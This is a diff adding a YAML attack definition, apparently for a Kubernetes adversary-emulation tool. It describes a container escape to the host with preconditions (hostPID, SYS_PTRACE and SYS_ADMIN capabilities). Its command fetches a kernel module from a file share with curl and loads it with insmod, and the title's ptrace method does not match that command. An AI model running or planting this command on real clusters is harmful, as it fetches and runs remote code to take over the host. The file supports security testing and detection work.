@@ -1,0 +1,22 @@
+name: Escape container via ptrace 🚧
+description: Abuse the legitimate OS debugging mechanisms to escape the container via attaching to a node process.
+tactic: "Privilege Escalation"
+techniques: ["Escape to Host"]
+preconditions:
+  "kind": Session
+  "Pod.securityContext.hostPID": true
+  "Container.securityContext.capabilities": [SYS_PTRACE, SYS_ADMIN]
+effects: []
+command: "EscapeHost"
+cmd: |
+  curl -O ${FILESHARE}/${MODULE};
+  insmod ${MODULE}
+defend:
+  # - tactic: detect
+  #   id: D3-SCA
+  #   syscall: setns
+  # - tactic: detect
+  #   id: D3-PSA
+  #   process_creation: nsenter
+refernces:
+  - "[https://kubehound.io/reference/attacks/CE_MODULE_LOAD/](KubeHound CE_MODULE_LOAD)"
